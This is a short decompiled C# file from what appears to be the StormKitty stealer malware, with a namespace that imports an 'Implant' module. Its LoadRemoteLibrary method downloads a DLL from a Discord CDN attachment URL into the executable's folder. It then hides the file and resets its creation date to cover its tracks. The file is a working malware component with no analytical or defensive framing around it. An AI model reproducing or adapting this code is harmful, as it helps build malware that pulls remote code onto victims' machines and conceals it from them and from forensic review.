using System;
using System.IO;
using System.Net;
using StormKitty.Implant;

namespace StormKitty
{
	// Token: 0x0200004E RID: 78
	internal sealed class Libs
	{
		// Token: 0x06000142 RID: 322 RVA: 0x0000B40C File Offset: 0x0000960C
		public static bool LoadRemoteLibrary(string library)
		{
			string text = Path.Combine(Path.GetDirectoryName(Startup.ExecutablePath), Path.GetFileName(new Uri(library).LocalPath));
			if (!File.Exists(text))
			{
				try
				{
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile(library, text);
					}
				}
				catch (WebException)
				{
					return false;
				}
				Startup.HideFile(text);
				Startup.SetFileCreationDate(text);
			}
			return File.Exists(text);
		}

		// Token: 0x0400008D RID: 141
		public static string ZipLib = "https://cdn.discordapp.com/attachments/976450031387283498/977205432772857926/DotNetZip.dll";
	}
}
